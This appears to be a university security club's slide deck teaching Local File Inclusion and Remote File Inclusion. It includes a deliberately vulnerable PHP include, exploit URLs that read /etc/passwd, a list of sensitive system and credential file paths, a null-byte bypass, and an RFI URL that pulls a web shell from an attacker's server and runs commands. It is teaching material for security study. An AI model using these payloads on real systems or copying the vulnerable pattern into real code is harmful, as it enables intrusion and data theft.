# Local File Inclusion

By: Nick Bulischeck

CU Cyber


## You Can Find These Presentations Online

Visit [cucyber.net](https://cucyber.net/) to find these presentations and more online!

<span style="padding-top: 6em; font-size: 0.4em; float: left;">Material: <a href="https://tldrlegal.com/license/creative-commons-attribution-sharealike-4.0-international-(cc-by-sa-4.0)">Creative Commons Attribution-ShareAlike 4.0</a></span><span style="padding-top: 6em; font-size: 0.4em; float: right;">Code: <a href="https://tldrlegal.com/license/bsd-2-clause-license-(freebsd)">BSD 2-Clause</a></span>



## What is Local File Inclusion?

* LFI is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application

Note:
Watch Ippsec do LFI using burp: https://youtu.be/rs4zEwONzzk?t=385


## How Does LFI Get Into Code?

* The vulnerability occurs due to the use of user-supplied input without proper validation
* More specifically, `include` statements are not properly sanitized



## Testing for LFI

* In a blackbox testing approach, we should look for scripts which take filenames as parameters


### Testing for LFI

* `http://127.0.0.1/view.php?file=index.html`

```
<?php
  include($_GET['file']);
?>
```



## Exploiting LFI

Note:
Now that you know how LFI works, how would you use it to exploit the server?


### Exploiting LFI

* `http://127.0.0.1/view.php?file=/etc/passwd`


### Interesting Linux File Paths

* /etc/issue
* /proc/version
* /etc/profile
* /etc/passwd
* /etc/shadow
* /root/.bash_history
* /var/mail/root
* /var/spool/cron/crontabs/root


### Bypassing LFI File Restrictions

```
<?php
  include($_GET['file'] . ".php");
?>
```

Note:
* How are C strings represented in memory?
* What happens when strlen finds a null character?


### Bypassing LFI File Restrictions

* `http://127.0.0.1/view.php?file=/etc/passwd%00`



## Remote File Inclusion

* In RFI, the attacker is able to execute code hosted on their own machine.

Note: 
Watch Ippsec attempt RFI: https://youtu.be/rs4zEwONzzk?t=520


### RFI Example

`http://vulnerable/index.php?page=http://yourserver/webshell.txt&cmd=ifconfig`



## Lab Demo



# Questions?
